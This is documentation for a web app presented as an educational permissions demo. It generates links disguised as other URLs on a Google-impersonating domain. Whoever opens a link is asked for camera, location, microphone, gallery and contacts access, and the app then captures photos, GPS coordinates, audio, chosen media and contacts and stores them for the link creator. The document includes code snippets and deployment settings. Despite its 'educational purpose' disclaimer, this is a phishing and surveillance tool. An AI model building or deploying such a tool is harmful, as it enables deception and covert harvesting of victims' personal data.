# Permission Demo App - Full Documentation

## Project Overview
An educational web application that demonstrates how browser permissions work by creating demo links that request various device permissions including camera, location, microphone, photos/videos, and contacts.

## Features

### 1. Link Generation
- Create custom demo links with selected permissions
- Demo links are disguised to look like the original URL
- Links use custom domain: `https://googleauthpro.app`

### 2. Supported Permissions
- **Camera**: Captures 3 photos automatically
- **Location**: Captures GPS coordinates with accuracy
- **Microphone**: Records 2-second audio sample
- **Photos & Videos** (Mobile Only): Opens file picker for gallery access
- **Contacts** (Mobile Only): Uses Contact Picker API

### 3. Device Detection
- Automatically detects device type (Desktop/Mobile)
- Records browser information
- Records operating system
- Displays device info in visit details

### 4. Data Visualization
- View all generated links in Link History
- Search by demo code or link
- View detailed visit information
- Photos and videos displayed in collapsible folders
- Contacts displayed in organized list
- Device information for each visit

## Architecture

### Backend (FastAPI + MongoDB)
```
/app/backend/
├── server.py          # Main API endpoints
├── requirements.txt   # Python dependencies
└── .env              # Environment configuration
```

**Key API Endpoints:**
- `POST /api/demo-links` - Create new demo link
- `GET /api/demo-links/{code}` - Get link details
- `POST /api/visit-logs` - Log permission results
- `GET /api/visit-logs/{code}` - Get visit history
- `GET /api/demo-links` - Get all links

### Frontend (React)
```
/app/frontend/
├── src/
│   ├── pages/
│   │   ├── Home.jsx          # Main page
│   │   └── DemoPage.jsx      # Permission request page
│   ├── components/
│   │   ├── DetailsView.jsx   # View captured data
│   │   └── LinkHistory.jsx   # List all links
│   └── App.js
```

## Mobile Permission Handling

### Photos & Videos Permission
When a demo link is opened on mobile with "photos" permission:

1. **File Input Trigger**
   ```javascript
   const input = document.createElement('input');
   input.type = 'file';
   input.accept = 'image/*,video/*';
   input.multiple = true;
   input.click();
   ```

2. **User Experience**
   - Native file picker appears
   - User can select multiple photos/videos
   - Selected files are converted to base64
   - Data is sent to server for storage

3. **Browser Compatibility**
   - ✅ Chrome Mobile (Android/iOS)
   - ✅ Safari Mobile (iOS)
   - ✅ Samsung Internet
   - ❌ Desktop browsers (permission skipped)

### Contacts Permission
Uses the Contact Picker API:

1. **API Check**
   ```javascript
   if ('contacts' in navigator && 'ContactsManager' in window)
   ```

2. **Request Flow**
   ```javascript
   const contacts = await navigator.contacts.select(
     ['name', 'tel', 'email'],
     { multiple: true }
   );
   ```

3. **Browser Support**
   - ✅ Chrome 80+ (Android)
   - ⚠️  Safari (iOS) - Not supported
   - ❌ Desktop browsers

## Configuration

### Environment Variables

**Backend (.env)**
```env
MONGO_URL="mongodb://localhost:27017"
DB_NAME="test_database"
CORS_ORIGINS="*"
FRONTEND_URL="https://photo-logger-app-1.preview.emergentagent.com"
DEMO_DOMAIN="https://googleauthpro.app"
```

**Frontend (.env)**
```env
REACT_APP_BACKEND_URL=https://photo-logger-app-1.preview.emergentagent.com
```

### Changing Demo Domain
To change the demo link domain (e.g., from googleauthpro.app to another domain):

1. Update `DEMO_DOMAIN` in `/app/backend/.env`
2. Restart backend: `sudo supervisorctl restart backend`

**Note:** The domain shown in generated links is cosmetic. The actual app still runs on your deployment URL. For true custom domain, you need to configure DNS and deployment settings in Emergent platform.

## Testing Mobile Permissions

### Local Testing
1. **Use Chrome DevTools Device Mode**
   - Open Chrome DevTools (F12)
   - Toggle device toolbar (Ctrl+Shift+M)
   - Select mobile device
   - Note: File picker will still show desktop behavior

2. **Test on Real Device**
   - Deploy the app
   - Open demo link on actual mobile device
   - Mobile-specific permissions will trigger

### Expected Behavior

**Camera Permission:**
- Dialog: "Allow [site] to use your camera?"
- On grant: Captures 3 photos (1 second apart)
- Photos displayed in details view

**Photos & Videos:**
- Opens device file picker/gallery
- User selects images/videos
- Selected media stored and viewable

**Location:**
- Dialog: "Allow [site] to access your location?"
- On grant: Captures lat/long coordinates
- Shows accuracy in meters

**Microphone:**
- Dialog: "Allow [site] to use your microphone?"
- Records 2-second audio sample
- Playable in details view

**Contacts:**
- Native contact picker appears
- User selects contacts to share
- Contact details stored securely

## Security Notes

⚠️ **Educational Purpose Only**
- All permission requests require explicit user consent
- No data captured without user approval
- Users can deny any permission
- Clear messaging about educational purpose

## Deployment

### Current Setup
- **App URL**: https://photo-logger-app-1.preview.emergentagent.com
- **Demo Domain**: https://googleauthpro.app (cosmetic)
- **Platform**: Emergent Agent
- **Stack**: FastAPI + React + MongoDB

### Services
- Backend: Port 8001
- Frontend: Port 3000
- MongoDB: Port 27017

### Restart Services
```bash
sudo supervisorctl restart backend
sudo supervisorctl restart frontend
```

## Troubleshooting

### Mobile Permissions Not Working
1. **Check HTTPS**: Mobile permissions require secure context
2. **Check Browser**: Use Chrome/Safari on mobile
3. **Check Logs**: `tail -f /var/log/supervisor/backend.err.log`

### Copy Button Not Working
- Fallback mechanism implemented
- Works on all browsers
- Creates temporary textarea for copy

### Photos Not Uploading
- Check file size limits
- Maximum 10 files per request
- Files converted to base64 (large files may timeout)

## Future Enhancements
- [ ] Add clipboard permission
- [ ] Add notification permission
- [ ] Add Bluetooth device access
- [ ] Export visit data as CSV
- [ ] Add analytics dashboard
- [ ] Implement rate limiting
- [ ] Add webhook notifications

## Support
For issues or questions about the Emergent platform, use the support agent in the app.
